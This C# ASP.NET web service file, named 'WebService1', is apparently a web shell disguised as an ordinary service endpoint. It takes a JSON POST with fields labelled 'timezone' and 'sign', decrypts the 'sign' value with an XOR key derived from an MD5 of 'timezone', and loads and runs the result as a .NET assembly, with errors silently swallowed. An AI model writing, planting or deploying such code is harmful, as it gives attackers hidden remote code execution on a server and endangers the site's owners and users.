<%@ WebService Language="C#" Class="WebService1" %>

using System;
using System.Web;
using System.Web.Services;
using System.Web.SessionState;
using System.Text;
using System.Security.Cryptography;
using System.IO;
using System.Reflection;
using Newtonsoft.Json;

[WebService(Namespace = "http://tempuri.org/")]
[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
public class WebService1 : System.Web.Services.WebService
{
    [WebMethod(EnableSession = true)]
    public void ProcessRequest()
    {
        try
        {
            string postData = "";
            using (StreamReader reader = new StreamReader(Context.Request.InputStream))
            {
                postData = reader.ReadToEnd();
            }
            
            if (!string.IsNullOrEmpty(postData))
            {
                dynamic data = JsonConvert.DeserializeObject(postData);
                string timezone = data?.timezone;
                string sign = data?.sign;
                
                if (!string.IsNullOrEmpty(timezone) && !string.IsNullOrEmpty(sign))
                {
                    string key = GenerateKey(timezone);
                    Session["k"] = key;
                    
                    byte[] decodedSign = Convert.FromBase64String(sign);
                    byte[] keyBytes = Encoding.UTF8.GetBytes(key);
                    
                    // XOR decryption with offset 5
                    for (int i = 0; i < decodedSign.Length; i++)
                    {
                        decodedSign[i] = (byte)(decodedSign[i] ^ keyBytes[(i + 5) & 15]);
                    }
                    
                    // Convert decrypted bytes to string for parsing
                    string decryptedContent = Encoding.UTF8.GetString(decodedSign);
                    
                    // Find the first underscore after shellcode
                    int underscoreIndex = decryptedContent.IndexOf("_");
                    if (underscoreIndex != -1)
                    {
                        // Split into shellcode and parameters
                        string shellcodePart = decryptedContent.Substring(0, underscoreIndex);
                        string paramsPart = decryptedContent.Substring(underscoreIndex + 1);
                        
                        // Parse parameters (key1-value1,key2-value2,... format)
                        if (!string.IsNullOrEmpty(paramsPart))
                        {
                            string[] pairs = paramsPart.Split(',');
                            foreach (string pair in pairs)
                            {
                                string trimmedPair = pair.Trim();
                                if (trimmedPair.Contains("-"))
                                {
                                    int dashIndex = trimmedPair.IndexOf("-");
                                    string paramKey = trimmedPair.Substring(0, dashIndex).Trim();
                                    string paramValue = trimmedPair.Substring(dashIndex + 1).Trim();
                                    if (!string.IsNullOrEmpty(paramKey))
                                    {
                                        // Store in session
                                        Session[paramKey] = paramValue;
                                    }
                                }
                            }
                        }
                        
                        // Convert shellcode back to bytes for execution
                        byte[] shellcodeBytes = Encoding.UTF8.GetBytes(shellcodePart);
                        
                        // Load and execute assembly
                        Assembly.Load(shellcodeBytes).CreateInstance("U").Equals(Context);
                    }
                    else
                    {
                        // If no underscore found, treat as original shellcode
                        Assembly.Load(decodedSign).CreateInstance("U").Equals(Context);
                    }
                }
            }
        }
        catch { }
    }
    
    private string GenerateKey(string timezone)
    {
        using (MD5 md5 = MD5.Create())
        {
            byte[] hash = md5.ComputeHash(Encoding.UTF8.GetBytes(timezone));
            StringBuilder sb = new StringBuilder();
            foreach (byte b in hash)
                sb.Append(b.ToString("x2"));
            return sb.ToString().Substring(0, 16);
        }
    }
}